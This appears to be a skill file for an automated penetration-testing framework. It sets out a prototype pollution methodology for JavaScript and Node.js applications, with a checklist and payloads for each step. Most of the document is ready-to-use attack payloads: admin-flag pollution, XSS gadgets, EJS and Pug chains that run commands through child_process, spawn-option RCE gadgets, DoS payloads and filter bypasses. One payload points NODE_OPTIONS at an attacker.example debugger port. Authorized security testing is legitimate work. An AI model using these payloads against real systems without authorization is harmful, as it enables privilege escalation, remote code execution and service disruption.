---
name: prototype-pollution
description: Detect and exploit JavaScript prototype pollution in client-side and server-side applications
origin: Vigil
---

# Prototype Pollution Testing

> **`vigil assess kali` audit flags:** use `--technique OTHER` (prototype pollution is a primitive with variable outcomes). Switch to `XSS` or `RCE` when the pollution produces that specifically.

## When to Activate

- JavaScript/Node.js application accepts JSON input that may flow through deep merge or recursive assignment
- Client-side JavaScript processes URL parameters, hash fragments, or JSON into objects
- Server-side Express/Koa/Fastify endpoints accept nested JSON bodies

## Tools

- `vigil assess kali exec -- curl ...` (server-side pollution probing via JSON bodies — all target-facing curl must go through the kali exec wrapper; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 30`)
- Browser DevTools (client-side pollution detection and gadget chain testing — client-side analysis, not target-facing)
- `ppmap` / `ppfuzz` (automated client-side prototype pollution scanning)

## Methodology

### 1. Server-Side Detection
- [ ] Send `__proto__` pollution probe in JSON body
```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
```
- [ ] Verify pollution reflected in subsequent responses or behavior changes
- [ ] Test alternate pollution vectors
```json
{"__proto__": {"status": 200}}
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```
- [ ] Test deep-nested payloads that survive sanitization
```json
{"a": {"__proto__": {"polluted": "yes"}}}
{"a": {"constructor": {"prototype": {"polluted": "yes"}}}}
```

### 2. Client-Side Detection
- [ ] URL parameter pollution
```
?__proto__[polluted]=yes
?__proto__.polluted=yes
?constructor[prototype][polluted]=yes
#__proto__[polluted]=yes
```
- [ ] Open browser console and check: `({}).polluted === "yes"`
- [ ] Test via hash fragment (common in SPA routing)
- [ ] Check for vulnerable merge libraries in JS bundles (lodash.merge, jQuery.extend, deep-extend)

### 3. Vulnerable Merge Functions
- [ ] Identify deep merge / recursive assign usage in source
```
lodash.merge         lodash.defaultsDeep    lodash.mergeWith
jQuery.extend(true)  $.extend(true)
Hoek.merge           Hoek.applyToDefaults
deep-extend          deap.merge             mixin-deep
```
- [ ] Test prototype chain traversal through each identified function

### 4. Chains to XSS
- [ ] Pollute innerHTML handlers or template variables
```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}
```
- [ ] Framework-specific gadgets (EJS, Pug, Handlebars)
```json
// EJS: pollute opts.outputFunctionName
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
// Pug: pollute block
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
// Handlebars: pollute constructor template
{"__proto__": {"pendingContent": "<script>alert(1)</script>"}}
```

### 5. Chains to RCE
- [ ] Pollute child_process spawn options
```json
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}
{"__proto__": {"shell": true}}
```
- [ ] Pollute NODE_OPTIONS for module preload
```json
{"__proto__": {"env": {"NODE_OPTIONS": "--inspect=attacker.example:9229"}}}
```

### 6. Chains to DoS
- [ ] Pollute toString or valueOf
```json
{"__proto__": {"toString": {"0": "throw new Error()"}}}
{"__proto__": {"valueOf": null}}
```
- [ ] Pollute hasOwnProperty to break object iteration
```json
{"__proto__": {"hasOwnProperty": null}}
```

### 7. Framework-Specific Testing
- [ ] Express: test body-parser JSON with nested `__proto__`
- [ ] Koa: test koa-bodyparser with deep objects
- [ ] Fastify: test JSON schema validation bypass via prototype keys
- [ ] Next.js / Nuxt.js: test API route handlers and getServerSideProps

### 8. Filter Bypass
- [ ] Use `constructor.prototype` instead of `__proto__`
- [ ] Use Unicode escapes: `\u005f\u005fproto\u005f\u005f`
- [ ] Nest pollution inside arrays: `[{"__proto__": {"polluted": true}}]`
- [ ] Case variations where parsers normalize keys

## What to Record

- Pollution vector (URL parameter, JSON body, hash fragment)
- Exact payload that achieves pollution
- Proof of pollution (console output, behavior change, error) — confirming `({}).polluted === "yes"` is not enough; you must show the **attacker outcome** (e.g., polluted `isAdmin: true` property was respected by the access check and granted admin panel access, EJS `outputFunctionName` gadget chain achieved RCE via `id` execution, XSS payload fired in another user's browser via polluted innerHTML handler)
- Gadget chain details if escalated to XSS/RCE/DoS
- Affected library/function and version
- Full request/response for reproducibility

## Extended Resources

_(none — methodology in skill)_
